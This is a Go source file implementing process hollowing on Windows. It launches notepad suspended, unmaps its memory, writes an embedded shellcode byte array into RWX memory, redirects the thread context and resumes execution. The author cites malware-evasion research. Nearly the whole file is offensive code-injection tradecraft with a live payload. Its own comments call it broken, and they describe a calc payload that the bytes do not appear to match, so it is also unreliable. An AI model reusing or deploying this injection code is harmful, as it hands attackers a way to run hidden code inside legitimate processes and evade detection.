/*
	@saulpanders
	Process hollowing shellcode injection technique

	currently pops shellcode for calc


	METHOD:

			1. Start new process in suspended state by calling CreateProcess w/ CREATE_SUSPENDED (0x4)
			2. Unmap memory allocated for proc w/ NtUnmapViewOfSection
			3. Allocate space in memory for payload using VirtualAllocEx
			4. Inject payload into memory at allocated region w/ WriteProcessMemory
			5. Change execution point of target process to start on payload w/ GetThreadContext
			6. Resume target process execution by calling ResumeThread


	TODO:

		XOR encoder for shellcode
		Refactor code to "functions"

	BUILD:

		go build processhollowing.go -o goProcessHollowing.exe

		I like to use notepad to test

		///SHIT IS BROKEN FIX LATER (NO THREAD CONTEXT DATA STRUCT, MORE RESEARCH NEEDED)


	inspired by https://www.deepinstinct.com/2019/09/15/malware-evasion-techniques-part-1-process-injection-and-manipulation/

*/

package main

import (
	//"encoding/hex"
	//"flag"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	CREATE_SUSPENDED = 0x00000004

	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE          = 0x04
	PAGE_EXECUTE_READ       = 0x20
	PAGE_READ_WRITE_EXECUTE = 0x40

	CREATE_NO_WINDOW = 0x08000000

	THREAD_SET_CONTEXT = 0x0010

	CONTEXT_i386    = 0x10000
	CONTEXT_INTEGER = (CONTEXT_i386 | 0x02)
)

type FLOATING_SAVE_AREA struct {
	ControlWord   uint32
	StatusWord    uint32
	TagWord       uint32
	ErrorOffset   uint32
	ErrorSelector uint32
	DataOffset    uint32
	DataSelector  uint32
	RegisterArea  [80]byte
	Cr0NpxState   uint32
}

type CONTEXT struct {
	//retrieved by CONTEXT_DEBUG_REGISTER
	ContextFlags uint32
	Dr0          uint32
	Dr1          uint32
	Dr2          uint32
	Dr3          uint32
	Dr6          uint32
	Dr7          uint32
	//retrieved by CONTEXT_FLOATING_POINT
	FloatSave FLOATING_SAVE_AREA
	//retrieved by CONTEXT_SEGMENTS
	segGs uint32
	segFs uint32
	segEs uint32
	segDs uint32
	//retrieved by CONTEXT_INTEGER
	Edi uint32
	Esi uint32
	Ebx uint32
	Edx uint32
	Ecx uint32
	Eax uint32
	//retrieved by CONTEXT_CONTROL
	Ebp    uint32
	Eip    uint32
	SegCs  uint32
	EFlags uint32
	Esp    uint32
	SegSs  uint32
	//retrieved by CONTEXT_EXTENDED REGISTERS
	ExtendedRegisters [512]byte
}

func main() {

	//ARGS

	//verbose := flag.Bool("verbose", false, "Enable verbose output")
	//flag.Parse()
	val := true
	verbose := &val

	//Pop Calc Shellcode - SOLID SHELLCODE POC
	/*shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}*/
	shellcode := []byte{0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9, 0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b, 0x36, 0x38, 0x4f, 0x18, 0x75, 0xf3, 0x59, 0x01, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b, 0x45, 0x3c, 0x8b, 0x54, 0x28, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a, 0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a, 0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c, 0x01, 0xeb, 0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2, 0x08, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68, 0x8e, 0x4e, 0x0e, 0xec, 0x52, 0xe8, 0x9f, 0xff, 0xff, 0xff, 0x89, 0x45, 0x04, 0xbb, 0x7e, 0xd8, 0xe2, 0x73, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89, 0x45, 0x08, 0x68, 0x6c, 0x6c, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89, 0xe6, 0x56, 0xff, 0x55, 0x04, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d, 0xbc, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x6f, 0x78, 0x58, 0x20, 0x68, 0x61, 0x67, 0x65, 0x42, 0x68, 0x4d, 0x65, 0x73, 0x73, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89, 0xe3, 0x68, 0x65, 0x63, 0x74, 0x58, 0x68, 0x63, 0x69, 0x6e, 0x6a, 0x68, 0x2d, 0x70, 0x72, 0x6f, 0x68, 0x6d, 0x20, 0x67, 0x6f, 0x68, 0x20, 0x66, 0x72, 0x6f, 0x68, 0x43, 0x69, 0x61, 0x6f, 0x31, 0xc9, 0x88, 0x4c, 0x24, 0x17, 0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0, 0x31, 0xc0, 0x50, 0xff, 0x55, 0x08}

	//import libraries
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	GetThreadContext := kernel32.NewProc("GetThreadContext")
	SetThreadContext := kernel32.NewProc("SetThreadContext")
	//ResumeThread := kernel32.NewProc("ResumeThread")

	NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	var psec windows.SecurityAttributes
	var tsec windows.SecurityAttributes

	//create suspended process - CreateProcess
	argv := syscall.StringToUTF16Ptr("C:\\WINDOWS\\sysWOW64\\notepad.exe")
	errCreateProcess := windows.CreateProcess(argv, nil, &psec, &tsec, false, CREATE_SUSPENDED, nil, nil, &si, &pi)

	if errCreateProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created a process with PID: %d", pi.ProcessId))
	}

	//unmapping memory - NtUnmapViewOfSection
	_, _, errNtUnmapViewOfSection := NtUnmapViewOfSection.Call(uintptr(pi.Process))

	if errNtUnmapViewOfSection != nil && errNtUnmapViewOfSection.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling NtUnmapViewOfSection:\r\n%s", errNtUnmapViewOfSection.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully unmapped memory in %d", pi.ProcessId))

	}

	//Allocating memory in process - VirtualAllocEx
	addr, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READ_WRITE_EXECUTE)

	if errVirtualAllocEx != nil && errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", pi.ProcessId))
	}

	//Writing shellcode into allocated memory - WriteProcessMemory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pi.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", pi.ProcessId))

	}

	var cntx CONTEXT
	cntx.ContextFlags = CONTEXT_INTEGER

	//getting current thread context (to resume) GetThreadContext
	_, _, errGetThreadContext := GetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&cntx)))

	if errGetThreadContext != nil && errGetThreadContext.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling GetThreadContext:\r\n%s", errGetThreadContext.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got thread context  %d in %d", pi.Thread, pi.ProcessId))

	}

	//set thread context (EAX) to point to shellcode in memory
	cntx.Eax = uint32(addr)

	_, _, errSetThreadContext := SetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&cntx)))
	if errSetThreadContext != nil && errSetThreadContext.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SetThreadContext:\r\n%s", errSetThreadContext.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully set thread for %d in  %d", pi.Thread, pi.ProcessId))

	}

	//resuming thread
	_, errResumeThread := windows.ResumeThread(pi.Thread)
	if errResumeThread != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully resumed thread %d in %d", pi.Thread, pi.ProcessId))
	}

}
